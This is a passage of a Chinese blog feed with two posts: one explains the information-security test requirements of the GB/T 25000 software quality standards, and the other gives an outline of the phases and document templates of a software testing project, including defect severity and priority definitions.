    <updated>2020-09-29T11:27:19.528Z</updated>
    
    <content type="html"><![CDATA[<h1 id="通用软件测评之软件产品的信息安全性"><a href="#通用软件测评之软件产品的信息安全性" class="headerlink" title="通用软件测评之软件产品的信息安全性"></a>通用软件测评之软件产品的信息安全性</h1><h2 id="软件测评标准概述"><a href="#软件测评标准概述" class="headerlink" title="软件测评标准概述"></a>软件测评标准概述</h2><p>计算机软件是计算机应用的核心，其质量的好坏关系到计算机应用系统的成败，软件测评是提高软件质量的一个重要手段，目前我国软件开发、软件测评主要依照标准是《GBT 25000.51-2016系统与软件工程 系统与软件质量要求和评价(SQuaRE) 第51部分：就绪可用软件产品(RUSP)的质量要求和测试细则 》以及《GBT_25000.10-2016系统与软件工程 系统与软件质量要求和评价(SQuaRE) 第10部分：系统与软件质量模型》，这两个标准是对现行标准GB/T25000.51-2010以及GB/T16260.1-2006的修订。</p><a id="more"></a><p>新标准最大的改变是将软件产品的六个质量特性扩充为八个特性（功能性、性能效率、兼容性、易用性、可靠性、信息安全性、维护性、可移植性），新标准增加了信息安全性和兼容性这两大特性，本文主要针对软件的信息安全性质量特性要求进行解读。</p><h2 id="信息安全性定义"><a href="#信息安全性定义" class="headerlink" title="信息安全性定义"></a>信息安全性定义</h2><p>软件产品质量的信息安全性是指产品或者系统保护信息和数据的程度，以使用户、其他产品或系统具有与其授权类型和授权级别一致的数据访问度。</p><p>在《GBT 25000.51-2016系统与软件工程 系统与软件质量要求和评价(SQuaRE) 第51部分：就绪可用软件产品(RUSP)的质量要求和测试细则》信息安全性要求为：</p><p>软件应按照用户文档集中定义的信息安全性特征来运行。<br>软件应能防止对程序和数据的未授权访问(不管是无意的还是故意的)。<br>软件应能识别出对结构数据库或文件完整性产生损害的事件，且能阻止该事件，并通报给授权用户。<br>软件应能按照信息安全要求，对访问权限进行管理。<br>软件应能对保密数据进行保护，只允许授权用户访问。</p><h2 id="信息安全性解析"><a href="#信息安全性解析" class="headerlink" title="信息安全性解析"></a>信息安全性解析</h2><p>信息安全性一般划分为以下6个子特性：保密性、完整性、抗抵赖性、可核查性、真实性、信息安全性的依从性。我们依据《GBT_25000.10-2016系统与软件工程 系统与软件质量要求和评价(SQuaRE) 第10部分：系统与软件质量模型》中的要求对其各个子特性逐一进行分析</p><h3 id="保密性"><a href="#保密性" class="headerlink" title="保密性"></a>保密性</h3><p><strong>要求：</strong>产品或系统确保数据只有在被授权时才能被访问的程度。</p><p><strong>测试内容：</strong></p><ol><li><p>验证软件产品是否具有对系统正常访问的控制能力依据安全策略和用户角色没置访问控制矩阵，用户权限应遵循“最小权限原则”</p></li><li><p>测试系统是否进行用户身份鉴别，并在每次用户登录系统时进行鉴别。</p></li><li><p>测试软件鉴别信息是否为不可见，且具有相应的抗攻击能力，并在存储或传输时用加密方法/具有相同安全强度的其他方法进行安全保护</p></li><li><p>验证数据在传输过程中不被窃听，对整个通信过程中的整个报文或会话过程进行加密，如采用3DES(三重数据加密算法)、AES(高级加密标准)和IDEA(国际数据加密算法)等加密处理。</p></li><li><p>明确区分系统中不同用户权限，系统不会因用户的权限的改变造成混乱。</p></li><li><p>合适的身份认证方式，用户登密码是否是可见、可复制，密码的存储和传输安全，密码策略保证密码安全</p></li><li><p>测试系统是否对不成功的鉴别尝试的值(包括尝试次数和时间的阈值)进行预先定义，井明确规定达到该值时是否采取了具有规范性和安全性的措施来实现鉴别失败的处理。</p></li><li><p>软件应能防止对程序和数据的未授权访何(不管是无意的还是故意的).</p></li></ol><p><strong>测试用例参考：</strong></p><blockquote><p><em>明确区分系统中不同的用户权限</em></p><p><em>系统不会因用户的权限的改变造成混乱，把原来高权限用户改为低权限用户，登录后系统是否异常</em></p><p><em>系统中存在用户登录鉴别模块，并且每次登录需要鉴别</em></p><p><em>是否存在登录验证码，登录失败次数限制等抗攻击能力</em></p><p><em>用户登录密码是否可见、可复制，密码是否加密存储和传输</em></p><p><em>网站是否为https协议传输</em></p><p><em>是否可以通过绝对路径登录系统（访问用户登录后的链接直接进入系统）</em></p></blockquote><h3 id="完整性"><a href="#完整性" class="headerlink" title="完整性"></a>完整性</h3><p><strong>要求：</strong>系统、产品或组件防止未授权访问、篡改计算机程序或数据的程度。</p><p><strong>测试内容：</strong></p><ol><li>验证对软件产品是杏具有对未授权用户非法访间的控制能力</li><li>采用专业测试工具开展“渗透测试”、“漏洞扫描”等手段，在模拟非法入侵攻击事件的条件下，验证软件产品是否有控制和处理能力</li><li>验证软件产品对非授权人创建、删除或修改信息是否有控制处理能力</li><li>软件应能识别出对结构数据库或文件完整性产生损害的事件，且能阻止该事件，并通报给授权人</li><li>系统数据的完整性、可管理性可备份和可恢复能力，数据传输、数据使用、数据存储的完整性</li></ol><p><strong>测试用例参考：</strong></p><blockquote><p><em>未授权访问，低权限用户访问高权限用户数据</em></p><p><em>未授权修改，无修改权限用户修改系统数据（包括创建、删除、修改）</em></p><p><em>漏洞扫描或渗透测试中，系统是否存在告警机制、是否存在自动限制账号、IP访问等控制处理功能</em></p><p><em>数据库、文件篡改、破坏是否具备防止和恢复功能</em></p><p><em>漏洞扫描测试未发现存在已知漏洞</em></p></blockquote><h3 id="抗抵赖性"><a href="#抗抵赖性" class="headerlink" title="抗抵赖性"></a>抗抵赖性</h3><p><strong>要求：</strong>活动或事件发生后可以被证实且不可被否认的程度。</p><p><strong>测试内容：</strong></p><ol><li>测试软件是否具有在请求的情况下为数据原发者提供数据原发证据的功能:</li><li>测试软件是否具有在请求的情况下为数据接收者提供数据接收证据的功能:</li><li>测试软件是否使用数字证书等方式保证用户的身份认证，在收到请求的情况下为数据原发者或接受者提供数据原发和接收的证据。</li><li>测试软件是否具备完整且无法算改的审计记录，确保用户操作可经过审计及追踪。系统操作日志/审计、异常日志、告警日志，审计日志的完整性、保密性。</li><li>验证审计日志的管理，日志不能被任何人修改和删除，能够形成完整的证据链。</li></ol><p><strong>测试用例参考：</strong></p><blockquote><p><em>用户操作是否存在审计日志</em></p><p><em>用户操作审计日志是否可以删除</em></p><p><em>软件是否使用数字证书加密</em></p><p><em>软件的系统操作日志、异常日志、告警日志，审计日志完整性，并只有授权用户能访问</em></p></blockquote><h3 id="可核查性"><a href="#可核查性" class="headerlink" title="可核查性"></a>可核查性</h3><p><strong>要求：</strong>实体的活动可以被唯一地追溯到该实体的程度。</p><p><strong>测试内容：</strong></p><ol><li>测试系统是否将用户进程与所有者用户相关联，使用户进程行为可以追溯到进程所有者用户</li><li>测试系统是否将系统进程动态地与当前服务要求者用户相关联，使系统进程的行为可以追溯到</li><li>测试系统或软件的审计模块，检查模块是否具有完善的安全审计功能考察启用安全审计功能后，覆盖用户的多少和安全事件的程度，覆盖到每个用户活动，日志记录内容至少应包括事件日期、事件、发起者信息、类型、描述和结果等，审计跟踪设置是否定义了审计跟踪极限的阀值，当存储空间被耗尽时，能否采取必要的保护措施</li><li>账户管理，包括账户唯一性、登录机制、密码管理策略</li><li>会话管理，设计登录成功使用新的会话:设计会话数据的存储安全；设计会话数据的传输安全；设计会话的安全终止；设计合理的会话存活时间:设计避免跨站请求伪造</li></ol><p><strong>测试用例参考：</strong></p><blockquote><p><em>审计模块是否具有安全审计功能，功能是否合理完善有效</em></p><p><em>身份标识具有唯一性，无法注册相同用户名</em></p><p><em>多因素登录保证用户登录的一致性，且其中一种至少应使用密码技术实现</em></p><p><em>是否存在避免跨站请求伪造漏洞，关键数据操作是否验证请求来源</em></p><p><em>用户退出登录后是否删除所有鉴权信息，退出登录系统后使用浏览器的后退功能是否可以不通过输入口令进入系统</em></p><p><em>是否存在登录连接超时自动退出功能</em></p></blockquote><h3 id="真实性"><a href="#真实性" class="headerlink" title="真实性"></a>真实性</h3><p><strong>要求：</strong>对象或资源的身份标识能够被证实符合其声明的程度。</p><p><strong>测试内容：</strong></p><ol><li>验证软件是否具有当前使用系统的用户列表和配置表。</li><li>验证软件在系统的访问历史数据库中记录的访问登录记录是否完整</li><li>检查软件是否具有用户使用系统的历史日志及日志管理功能。</li><li>在模拟攻击事件的入侵的情况下，验证软件的日志内容是否有相关记录。</li><li>检查软件中的”用户访问系统和数据”的记录内是否包括防止病毒的”病毒检测记录”。</li></ol><p><strong>测试用例参考：</strong></p><blockquote><p><em>软件是否存在用户管理模块，是否具有用户列表和配置表功能</em><br><em>查看数据库日志访问登录日志是否完整，真实记录</em><br><em>查看审计日志是否有用户登录使用日志</em><br><em>查看审计日志是否有攻击防护日志</em><br><em>软件中的”用户访问系统和数据”的记录内是否包括防止病毒的”病毒检测记录”</em></p></blockquote><h3 id="信息安全性的依从性"><a href="#信息安全性的依从性" class="headerlink" title="信息安全性的依从性"></a>信息安全性的依从性</h3><p><strong>要求：</strong>产品或系统遵循与信息安全性相关的标准、约定或法规以及类似规定的程度。</p><p><strong>测试内容：</strong></p><ol><li>检查软件产品的信息安全性是否遵循了所实施法规、标准和约定</li></ol><p><strong>测试用例参考：</strong></p><blockquote><p><em>软件是否遵循了所实施法规、标准和约定，行业标准、验收标准、等级保护标准等</em></p></blockquote><h2 id="附件：信息安全危害分级标准"><a href="#附件：信息安全危害分级标准" class="headerlink" title="附件：信息安全危害分级标准"></a>附件：信息安全危害分级标准</h2><p>目前定义有五类危害等级，危害等级定义依据为：</p><table><thead><tr><th align="center">漏洞等级</th><th align="left">漏洞危害说明</th></tr></thead><tbody><tr><td align="center">紧急</td><td align="left">可以直接被利用的漏洞，且利用难度较低。被攻击之后可能对网站或服务器的正常运行造成严重影响，或对用户财产及个人信息造成重大损失。</td></tr><tr><td align="center">高危</td><td align="left">被利用之后，造成的影响较大，但直接利用难度较高的漏洞。或本身无法直接攻击，但能为进一步攻击造成极大便利的漏洞。</td></tr><tr><td align="center">中危</td><td align="left">利用难度极高，或满足严格条件才能实现攻击的漏洞。或漏洞本身无法被直接攻击，但能为进一步攻击起较大帮助作用的漏洞。</td></tr><tr><td align="center">低危</td><td align="left">无法直接实现攻击，但提供的信息可能让攻击者更容易找到其他安全漏洞。</td></tr><tr><td align="center">信息</td><td align="left">本身对网站安全没有直接影响，提供的信息可能为攻击者提供少量帮助，或可用于其他手段的攻击，如社工等。</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;通用软件测评之软件产品的信息安全性&quot;&gt;&lt;a href=&quot;#通用软件测评之软件产品的信息安全性&quot; class=&quot;headerlink&quot; title=&quot;通用软件测评之软件产品的信息安全性&quot;&gt;&lt;/a&gt;通用软件测评之软件产品的信息安全性&lt;/h1&gt;&lt;h2 id=&quot;软件测评标准概述&quot;&gt;&lt;a href=&quot;#软件测评标准概述&quot; class=&quot;headerlink&quot; title=&quot;软件测评标准概述&quot;&gt;&lt;/a&gt;软件测评标准概述&lt;/h2&gt;&lt;p&gt;计算机软件是计算机应用的核心，其质量的好坏关系到计算机应用系统的成败，软件测评是提高软件质量的一个重要手段，目前我国软件开发、软件测评主要依照标准是《GBT 25000.51-2016系统与软件工程 系统与软件质量要求和评价(SQuaRE) 第51部分：就绪可用软件产品(RUSP)的质量要求和测试细则 》以及《GBT_25000.10-2016系统与软件工程 系统与软件质量要求和评价(SQuaRE) 第10部分：系统与软件质量模型》，这两个标准是对现行标准GB/T25000.51-2010以及GB/T16260.1-2006的修订。&lt;/p&gt;
    
    </summary>
    
    
      <category term="软件测评" scheme="http://yoursite.com/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%84/"/>
    
    
      <category term="信息安全性" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%80%A7/"/>
    
      <category term="通用软件测评" scheme="http://yoursite.com/tags/%E9%80%9A%E7%94%A8%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%84/"/>
    
  </entry>
  
  <entry>
    <title>软件测试项目实操指南与过程文档</title>
    <link href="http://yoursite.com/2020/09/28/Software-Test-Practice-Guide/"/>
    <id>http://yoursite.com/2020/09/28/Software-Test-Practice-Guide/</id>
    <published>2020-09-28T02:34:02.000Z</published>
    <updated>2020-09-29T11:27:01.277Z</updated>
    
    <content type="html"><![CDATA[<h1 id="软件测试项目实操指南与过程文档"><a href="#软件测试项目实操指南与过程文档" class="headerlink" title="软件测试项目实操指南与过程文档"></a>软件测试项目实操指南与过程文档</h1><p>软件测试分为如下几个阶段</p><h2 id="一、测试需求分析阶段"><a href="#一、测试需求分析阶段" class="headerlink" title="一、测试需求分析阶段"></a>一、测试需求分析阶段</h2><p>测试需求分析阶段主要工作是获得测试项目的测试需求(测试规格)。<br>输出产物:《可测试性需求说明书》和《测试规格》</p><a id="more"></a><p>在实际过程中针对软件的安全性测评项目，甲方通常会提供安全功能测试需求，这就需要我们通过需求分析把甲方的安全测试需求对应到软件的信息安全性的六大子特性中。通常情况软件的安全功能应该是和我们的软件产品质量的信息安全性是对应的，但是在实际检测过程中，由于软件的差异性和各自的功能需求特性，软件产品可能无法包含所有的安全子特性的所有要求，就需要我们给甲方指出缺失项，并和甲方客户确认协商。</p><p>测试计划文档目录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">一、概述</span><br><span class="line"> 1.1 需求分析目的</span><br><span class="line"> 1.2 需求分析的依据</span><br><span class="line"> 1.3 需求分析的方法</span><br><span class="line">二、软件产品说明</span><br><span class="line"> 2.1 项目背景</span><br><span class="line"> 2.2 项目需求说明</span><br><span class="line"> 2.3 项目整体设计说明</span><br><span class="line">三、测试需求分析</span><br><span class="line"> 3.1 原始需求</span><br><span class="line"> 3.2 产品测试需求列表</span><br><span class="line">3.2.1 功能测试需求</span><br><span class="line">3.2.2 安全测试需求</span><br><span class="line">3.2.3 性能测试需求</span><br><span class="line">3.2.4 压力测试需求</span><br><span class="line"> 3.3 测试类型确定</span><br><span class="line"> 3.4 测试环境要求</span><br><span class="line">3.4.1 硬件要求</span><br><span class="line">3.4.2 软件要求</span><br><span class="line">四、测试规格评估</span><br><span class="line"> 4.1 测试类型评估</span><br><span class="line"> 4.2 测试用例密度</span><br><span class="line"> 4.3 需求覆盖率</span><br></pre></td></tr></table></figure><p>参考文档链接：<a href="https://wenku.baidu.com/view/d28383ac4b7302768e9951e79b89680202d86b44.html" target="_blank" rel="noopener">软件测试需求分析报告</a></p><h2 id="二、测试计划阶段"><a href="#二、测试计划阶段" class="headerlink" title="二、测试计划阶段"></a>二、测试计划阶段</h2><p>以测试需求为基础,分析产品的总体测试策略。<br>输出产物:《产品总体测试计划》</p><p>当对需求有完整和全面的理解后，接下来我们需要制定详细的测试计划，为即将开始的测试工作做好充足的准备。</p><p>测试计划描述了要进行的测试活动的范围、方法、资源和进度的文档。它主要包括测试项、被测特性、测试任务、谁执行任务和风险控制等。</p><p>测试计划文档目录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">一、概述</span><br><span class="line"> 1.1 项目说明</span><br><span class="line"> 1.2 测试范围</span><br><span class="line">二、测试目标</span><br><span class="line">三、测试资源</span><br><span class="line"> 3.1 软件资源</span><br><span class="line"> 3.2 硬件资源</span><br><span class="line"> 3.3 测试工具</span><br><span class="line"> 3.4 人力资源</span><br><span class="line">四、测试种类和测试标准</span><br><span class="line"> 4.1 功能测试</span><br><span class="line"> 4.2 性能测试</span><br><span class="line"> 4.3 安全测试</span><br><span class="line"> 4.4 易用性测试</span><br><span class="line"> …………</span><br><span class="line">五、测试要点</span><br><span class="line">六、测试时间和进度</span><br><span class="line">七、风险及对策</span><br></pre></td></tr></table></figure><h2 id="三、测试方案设计阶段"><a href="#三、测试方案设计阶段" class="headerlink" title="三、测试方案设计阶段"></a>三、测试方案设计阶段</h2><p>本阶段主要是以测试规格为基础获得特性测试方案,对于有自动化测试的项目,<br>进行自动化测试的分析,获得测试策略<br>输出产物:《产品或者版本总体测试方案》</p><p>测试方案是指描述需要测试的特性、测试的方法、测试环境的规划、测试工具的设计和选择、测试用例的设计方法、测试代码的设计方案。</p><p>测试方案文档目录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">一、引言</span><br><span class="line">    1.1 编写目的</span><br><span class="line">    1.2 项目背景</span><br><span class="line">    1.3 项目相关方</span><br><span class="line">        1.3.1 委托方与联系方式</span><br><span class="line">        1.3.2 承研单位与联系方式</span><br><span class="line">        1.3.3 测试机构与联系方式</span><br><span class="line">    1.4 测试目标及范围</span><br><span class="line">    1.5 引用文件</span><br><span class="line">二、项目软件介绍</span><br><span class="line">    2.1 功能需求介绍</span><br><span class="line">    2.2 非功能需求介绍</span><br><span class="line">        2.2.1 性能效率需求</span><br><span class="line">        2.2.2 兼容性需求</span><br><span class="line">        2.2.3 易用性需求</span><br><span class="line">        2.2.4 可靠性需求</span><br><span class="line">        2.2.5 信息安全性需求</span><br><span class="line">        2.2.6 维护性需求</span><br><span class="line">        2.2.7可移植性需求测试需求</span><br><span class="line">三、测试需求分析</span><br><span class="line">    3.1 测试总体要求</span><br><span class="line">    3.2 功能性测试</span><br><span class="line">        3.2.1 测试分析</span><br><span class="line">        3.2.2 测试内容</span><br><span class="line">    3.3 性能效率测试</span><br><span class="line">        3.3.1 测试分析</span><br><span class="line">        3.3.2 测试内容</span><br><span class="line">    3.4 兼容性测</span><br><span class="line">        3.4.1 测试分析</span><br><span class="line">        3.4.2 测试内容</span><br><span class="line">    3.5 易用性测试</span><br><span class="line">        3.5.1 测试分析</span><br><span class="line">        3.5.2 测试内容</span><br><span class="line">    3.6 可靠性测试</span><br><span class="line">        3.6.1 测试分析</span><br><span class="line">        3.6.2 测试内容</span><br><span class="line">    3.7 信息安全性测试</span><br><span class="line">        3.7.1 测试分析</span><br><span class="line">        3.7.2 测试内容</span><br><span class="line">    3.8 维护性测试</span><br><span class="line">        3.8.1 测试分析</span><br><span class="line">        3.8.2 测试内容</span><br><span class="line">    3.9 可移植性测试</span><br><span class="line">        3.9.1 测试分析</span><br><span class="line">        3.9.2 测试内容</span><br><span class="line">    3.10 用户文档集测试</span><br><span class="line">        3.10.1 测试分析</span><br><span class="line">        3.10.2 测试内容</span><br><span class="line">    3.11 静态分析</span><br><span class="line">        3.11.1 测试分析</span><br><span class="line">        3.11.2 测试内容</span><br><span class="line">    3.12 安全渗透测试</span><br><span class="line">        3.12.1 测试分析</span><br><span class="line">        3.12.2 测试内容</span><br><span class="line">    3.13 测试需求追踪</span><br><span class="line">    3.14 测试项标识说明</span><br><span class="line">    3.15 测试方法</span><br><span class="line">        3.15.1 功能测试</span><br><span class="line">        3.15.2 性能效率测试</span><br><span class="line">        3.15.3 兼容性测试</span><br><span class="line">        3.15.4 易用性测试</span><br><span class="line">        3.15.5 可靠性测试</span><br><span class="line">        3.15.6 信息安全性测</span><br><span class="line">        3.15.7 维护性测试</span><br><span class="line">        3.15.8 可移植性测</span><br><span class="line">        3.15.9 用户文档集测试</span><br><span class="line">        3.15.10 静态分析</span><br><span class="line">        3.15.11 内存检测</span><br><span class="line">        3.15.12 软件质量度量</span><br><span class="line">        3.15.13 安全渗透测试</span><br><span class="line">    3.16 测试充分性要求</span><br><span class="line">    3.17 测试终止要求</span><br><span class="line">        3.17.1 正常终止</span><br><span class="line">        3.17.2 异常中止</span><br><span class="line">        3.17.3 中止及重新启动</span><br><span class="line">    3.18 测试通过准则</span><br><span class="line">四、测试环境</span><br><span class="line">    4.1 测试环境要求</span><br><span class="line">    4.2 静态测试环境</span><br><span class="line">        4.2.1 测试环境配置</span><br><span class="line">    4.3 功能测试环境</span><br><span class="line">        4.3.1 测试环境配置</span><br><span class="line">        4.3.2 环境差异影响分析</span><br><span class="line">    4.4 效率测试环境</span><br><span class="line">        4.4.1 测试环境配置</span><br><span class="line">        4.4.2 环境差异影响分析</span><br><span class="line">    4.5 测试工具配置</span><br><span class="line">        4.5.1 工具使用计划</span><br><span class="line">        4.5.2 测试工具介绍</span><br><span class="line">五、项目团队架构及职责</span><br><span class="line">    5.1 团队组织架构</span><br><span class="line">    5.2 团队职责分工</span><br><span class="line">六、测试计划进度</span><br><span class="line">    6.1 测试流程</span><br><span class="line">    6.2 进度计划</span><br><span class="line">七、过程质量管理</span><br><span class="line">    7.1 配置管理</span><br><span class="line">    7.2 质量保证</span><br><span class="line">        7.2.1 质量目标和要求</span><br><span class="line">        7.2.2 质量保证任务</span><br><span class="line">    7.3跟踪与控制</span><br><span class="line">八、测试交付成果</span><br><span class="line">九、测试验收规范</span><br><span class="line">十、风险分析应对</span><br></pre></td></tr></table></figure><h2 id="四、测试用例实现阶段"><a href="#四、测试用例实现阶段" class="headerlink" title="四、测试用例实现阶段"></a>四、测试用例实现阶段</h2><p>本阶段主要是完成各个特性的测试用例的编写和自动化脚本的编写。<br>输出产物:《产品自动化测试用例》和《手工执行测试用例》</p><p>用于描述测试用例的具体细节工作，测试用例一般根据测试计划及测试策略来编写</p><p>测试用例设计文档模板如下：</p><p><img src="/2020/09/28/Software-Test-Practice-Guide/1.png" alt></p><p>测试用例执行文档模板如下：</p><p><img src="/2020/09/28/Software-Test-Practice-Guide/2.png" alt></p><h2 id="五、测试执行阶段"><a href="#五、测试执行阶段" class="headerlink" title="五、测试执行阶段"></a>五、测试执行阶段</h2><p>本阶段是根据测试策略开展测试执行和回归测试<br>输出产品:《产品或版本测试报告》和《缺陷分析报告》</p><p>《测试报告文档模板》如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">一、测试基本信息</span><br><span class="line">二、被测系统概述</span><br><span class="line">三、测试资源</span><br><span class="line">    3.1 组织</span><br><span class="line">    3.2 测试环境及工具</span><br><span class="line">        3.2.1 测试环境一</span><br><span class="line">        3.2.2 测试环境二</span><br><span class="line">四、测试规程</span><br><span class="line">    4.1 充分性评价</span><br><span class="line">    4.2 测试过程</span><br><span class="line">五、测试结果</span><br><span class="line">    5.1 软件问题情况</span><br><span class="line">    5.2 测试执行结果</span><br><span class="line">        5.2.1 功能性测试</span><br><span class="line">        5.2.2 可靠性测试</span><br><span class="line">        5.2.3 易用性测试</span><br><span class="line">        5.2.4 效率测试</span><br><span class="line">        5.2.5 维护性测试</span><br><span class="line">        5.2.6 可移植性测试</span><br><span class="line">        5.2.7 用户文档测试</span><br><span class="line">        5.2.8 使用质量测试</span><br><span class="line">        5.2.9 产品说明测试</span><br><span class="line">附录A 软件问题清单</span><br><span class="line">附录B 效率测试结果</span><br></pre></td></tr></table></figure><p>《缺陷分析报告模板》如下：</p><p><img src="/2020/09/28/Software-Test-Practice-Guide/3.png" alt></p><p>缺陷填写说明见附件1</p><h2 id="六、评估与关闭阶段"><a href="#六、评估与关闭阶段" class="headerlink" title="六、评估与关闭阶段"></a>六、评估与关闭阶段</h2><p>只对前面的各个阶段的执行情况,完成对测试项目的关闭,同时提供完整的度量数据和项目总结报告<br>输出产物:《遗留问题风险分析报告》、《度量分析报告》和《测试关闭报告》</p><h1 id="附件1：软件测试缺陷的定义级别、优先级及状态"><a href="#附件1：软件测试缺陷的定义级别、优先级及状态" class="headerlink" title="附件1：软件测试缺陷的定义级别、优先级及状态"></a>附件1：软件测试缺陷的定义级别、优先级及状态</h1><h3 id="1、缺陷的定义及主要类型"><a href="#1、缺陷的定义及主要类型" class="headerlink" title="1、缺陷的定义及主要类型"></a>1、缺陷的定义及主要类型</h3><p>我们对软件缺陷分析一下,所谓”软件缺陷（bug）”，即为计算机软件或程序中存在的某种破坏正常运行能力的问题、错误，或者隐藏的功能缺陷。一般来说，软件缺陷的属性包括缺陷标识、缺陷类型、缺陷严重程度、缺陷优先级、缺陷来源、缺陷原因等。</p><p>进行软件缺陷分析后,软件缺陷的主要可以分为以下几种类型：</p><p>（1）设计不合理;</p><p>（2）功能、特性没有实现或部分实现; </p><p>（3）运行出错，包括运行中断、系统崩溃、界面混乱等;</p><p>（4）与需求不一致，在执行TestCase时则为实际结果和预期结果不一致;</p><p>（5）用户不能接受的其他问题，如存取时间过长、界面不美观等;</p><p>（6）软件实现了需求未提到的功能。</p><p>（7）软件存在安全漏洞</p><h3 id="2、缺陷的级别、优先级及状态"><a href="#2、缺陷的级别、优先级及状态" class="headerlink" title="2、缺陷的级别、优先级及状态"></a>2、缺陷的级别、优先级及状态</h3><h4 id="2-1-缺陷级别"><a href="#2-1-缺陷级别" class="headerlink" title="2.1 缺陷级别"></a>2.1 缺陷级别</h4><p>软件缺陷有四种级别，分别为：致命的(Fatal)，严重的(Critical)，一般的(Major)，微小的(Minor)。</p><p>A类—致命的软件缺陷(Fatal):造成系统或应用程序崩溃、死机、系统挂起，或造成数据丢失，主要功能完全丧失，导致本模块以及相关模块异常等问题。如代码错误，死循环，数据库发生死锁、与数据库连接错误或数据通讯错误，未考虑异常操作，功能错误等</p><p>B类—严重错误的软件缺陷（critical）：系统的主要功能部分丧失、数据不能保存，系统的次要功能完全丧失。问题局限在本模块，导致模块功能失效或异常退出。如致命的错误声明，程序接口错误，数据库的表、业务规则、缺省值未加完整性等约束条件</p><p>C类—一般错误的软件缺陷（major）：次要功能没有完全实现但不影响使用。如提示信息不太准确，或用户界面差，操作时间长，模块功能部分失效等，打印内容、格式错误，删除操作未给出提示，数据库表中有过多的空字段等</p><p>D类—较小错误的软件缺陷（Minor）:使操作者不方便或遇到麻烦，但它不影响功能过的操作和执行，如错别字、界面不规范（字体大小不统一，文字排列不整齐，可输入区域和只读区域没有明显的区分标志），辅助说明描述不清楚</p><p>E类- 建议问题的软件缺陷（Enhancemental）：由问题提出人对测试对象的改进意见或测试人员提出的建议、质疑。</p><h4 id="2-2-缺陷优先级"><a href="#2-2-缺陷优先级" class="headerlink" title="2.2 缺陷优先级"></a>2.2 缺陷优先级</h4><p>常用的软件缺陷的优先级表示方法可分为：立即解决P1、高优先级P2、正常排队P3、低优先级P4。立即解决是指缺陷导致系统几乎不能使用或者测试不能继续，需立即修复；高优先级是指缺陷严重影响测试，需要优先考虑；正常排队是指缺陷需要正常排队等待修复；而低优先级是指缺陷可以在开发人员有时间的时候再被纠正。</p><h4 id="2-3-缺陷状态"><a href="#2-3-缺陷状态" 